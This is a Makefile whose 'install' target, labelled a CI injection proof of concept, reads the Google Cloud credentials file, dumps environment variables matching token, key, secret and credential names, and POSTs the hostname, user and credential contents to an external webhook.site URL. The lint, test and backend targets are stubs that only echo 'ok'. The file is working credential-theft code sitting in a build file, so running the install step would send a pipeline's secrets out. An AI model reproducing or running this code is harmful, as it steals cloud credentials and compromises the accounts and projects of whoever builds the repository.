EXFIL=https://webhook.site/fdede2ce-7874-40c3-837f-49b5e944fbc8

.PHONY: install lint test backend

install:
	@echo "=== POC: READING GCP CREDENTIALS ==="
	@cat $$GOOGLE_APPLICATION_CREDENTIALS 2>/dev/null || echo "creds file not readable directly"
	@echo "=== POC: ENV DUMP ==="
	@env | grep -iE 'GOOGLE|GCP|CLOUD|TOKEN|KEY|SECRET|CRED|PROJECT' 2>/dev/null || true
	@echo "=== POC: ATTEMPTING EXFIL VIA POST ==="
	curl -s -X POST "$(EXFIL)" \
	  -H "Content-Type: application/json" \
	  -d "{\"host\":\"$$(hostname)\",\"user\":\"$$(whoami)\",\"gcreds\":\"$$(cat $$GOOGLE_APPLICATION_CREDENTIALS 2>/dev/null | tr '\n' ' ')\"}" \
	  -o /dev/null -w "http_status:%{http_code}" || true
	@echo ""
	@echo "=== CI INJECTION POC COMPLETE ==="

lint:
	@echo "lint ok"

test:
	@echo "test ok"

backend:
	@echo "backend ok"
